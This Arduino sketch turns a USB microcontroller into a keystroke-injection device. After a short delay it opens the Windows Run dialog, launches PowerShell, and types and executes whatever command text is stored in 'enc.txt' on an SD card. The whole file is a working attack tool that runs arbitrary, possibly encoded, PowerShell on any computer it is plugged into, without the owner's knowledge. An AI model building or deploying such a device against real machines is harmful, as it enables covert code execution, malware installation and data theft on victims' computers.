#include <SD.h>
#include <SPI.h>

// On the Ethernet Shield, CS is pin 4. Note that even if it's not
// used as the CS pin, the hardware CS pin (10 on most Arduino boards,
// 53 on the Mega) must be left as an output or the SD library
// functions will not work.


void setup()
{
    // put your setup code here, to run once:
    Keyboard.begin();
    delay(7000);

//   Serial.begin(9600); 
//   while (!Serial) {
//      ; // wait for serial port to connect. Needed for Leonardo only
//    }
     //Serial.print("Initializing SD card...");    
   pinMode(10, OUTPUT);  
   if (!SD.begin(10)) {
     Serial.println("Card failed, or not present"); 
     return;
   }
   Serial.println("card initialized.");
   
 }
int run = 1;
 void loop()
 {
  if(run == 1)
  {
    File myFile;
  
  
  
  // inject
   Keyboard.press(0x83);
  Keyboard.print("r");
  Keyboard.release(0x83);
  delay(1000);
  //Open command
    Keyboard.print("powershell");
    Keyboard.press(KEY_RETURN);
    delay(4);
    Keyboard.release(KEY_RETURN);
    delay(3000);
  myFile = SD.open("enc.txt");
  if (myFile) {  
    while (myFile.available()) {
      char c = myFile.read();
       Keyboard.print(c);
    }
    // close the file:
    myFile.close();
  } else {
    // if the file didn't open, print an error:
    Keyboard.print("failed");
    Serial.println("error opening test.txt");
  }
   
  Keyboard.press(KEY_RETURN);
  delay(4);
  Keyboard.release(KEY_RETURN);
  run = 0;
  }
 }


